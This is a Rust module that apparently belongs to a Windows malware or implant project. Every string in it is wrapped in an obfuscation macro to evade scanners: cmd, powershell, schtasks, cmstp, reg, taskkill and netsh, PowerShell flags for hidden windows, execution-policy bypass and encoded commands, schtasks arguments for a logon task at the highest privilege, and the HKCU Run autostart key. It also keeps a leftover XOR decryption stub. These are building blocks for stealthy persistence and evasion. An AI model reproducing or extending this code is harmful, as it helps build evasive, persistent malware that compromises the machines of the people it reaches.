#![allow(dead_code)]


pub mod exe {
    /// cmd.exe
    #[inline(always)]
    pub fn cmd() -> String {
        obfstr::obfstr!("cmd.exe").to_string()
    }

    /// powershell.exe
    #[inline(always)]
    pub fn powershell() -> String {
        obfstr::obfstr!("powershell.exe").to_string()
    }

    /// schtasks.exe
    #[inline(always)]
    pub fn schtasks() -> String {
        obfstr::obfstr!("schtasks.exe").to_string()
    }

    /// cmstp.exe
    #[inline(always)]
    pub fn cmstp() -> String {
        obfstr::obfstr!("cmstp.exe").to_string()
    }

    /// reg.exe
    #[inline(always)]
    pub fn reg() -> String {
        obfstr::obfstr!("reg.exe").to_string()
    }

    /// taskkill.exe
    #[inline(always)]
    pub fn taskkill() -> String {
        obfstr::obfstr!("taskkill.exe").to_string()
    }

    /// netsh.exe
    #[inline(always)]
    pub fn netsh() -> String {
        obfstr::obfstr!("netsh.exe").to_string()
    }
}

pub mod powershell {
    /// -File
    #[inline(always)]
    pub fn file() -> String {
        obfstr::obfstr!("-File").to_string()
    }

    /// -NoProfile
    #[inline(always)]
    pub fn no_profile() -> String {
        obfstr::obfstr!("-NoProfile").to_string()
    }

    /// -WindowStyle
    #[inline(always)]
    pub fn window_style() -> String {
        obfstr::obfstr!("-WindowStyle").to_string()
    }

    /// Hidden
    #[inline(always)]
    pub fn hidden() -> String {
        obfstr::obfstr!("Hidden").to_string()
    }

    /// -ExecutionPolicy
    #[inline(always)]
    pub fn execution_policy() -> String {
        obfstr::obfstr!("-ExecutionPolicy").to_string()
    }

    /// Bypass
    #[inline(always)]
    pub fn bypass() -> String {
        obfstr::obfstr!("Bypass").to_string()
    }

    /// -Command
    #[inline(always)]
    pub fn command() -> String {
        obfstr::obfstr!("-Command").to_string()
    }

    /// -NonInteractive
    #[inline(always)]
    pub fn non_interactive() -> String {
        obfstr::obfstr!("-NonInteractive").to_string()
    }

    /// -EncodedCommand
    #[inline(always)]
    pub fn encoded_command() -> String {
        obfstr::obfstr!("-EncodedCommand").to_string()
    }
}

pub mod args {
    /// /f (force)
    #[inline(always)]
    pub fn force() -> String {
        obfstr::obfstr!("/f").to_string()
    }

    /// /query
    #[inline(always)]
    pub fn query() -> String {
        obfstr::obfstr!("/query").to_string()
    }

    /// /tn
    #[inline(always)]
    pub fn task_name() -> String {
        obfstr::obfstr!("/tn").to_string()
    }

    /// /create
    #[inline(always)]
    pub fn create() -> String {
        obfstr::obfstr!("/create").to_string()
    }

    /// /tr
    #[inline(always)]
    pub fn task_run() -> String {
        obfstr::obfstr!("/tr").to_string()
    }

    /// /sc
    #[inline(always)]
    pub fn schedule() -> String {
        obfstr::obfstr!("/sc").to_string()
    }

    /// onlogon
    #[inline(always)]
    pub fn onlogon() -> String {
        obfstr::obfstr!("onlogon").to_string()
    }

    /// /rl
    #[inline(always)]
    pub fn run_level() -> String {
        obfstr::obfstr!("/rl").to_string()
    }

    /// highest
    #[inline(always)]
    pub fn highest() -> String {
        obfstr::obfstr!("highest").to_string()
    }

    /// /delete
    #[inline(always)]
    pub fn delete() -> String {
        obfstr::obfstr!("/delete").to_string()
    }

    /// /fo
    #[inline(always)]
    pub fn format_output() -> String {
        obfstr::obfstr!("/fo").to_string()
    }

    /// LIST
    #[inline(always)]
    pub fn list() -> String {
        obfstr::obfstr!("LIST").to_string()
    }
}

pub mod registry {
    /// HKEY_CURRENT_USER
    #[inline(always)]
    pub fn hkcu() -> String {
        obfstr::obfstr!("HKEY_CURRENT_USER").to_string()
    }

    /// SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    #[inline(always)]
    pub fn run_key() -> String {
        obfstr::obfstr!(r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run").to_string()
    }
}

// Legacy compatibility - xor_decrypt is no longer needed but kept for any remaining usages
#[inline(always)]
pub fn xor_decrypt(_encrypted: &[u8]) -> String {
    // This function is deprecated - migrate to obfstr!() macro directly
    String::new()
}
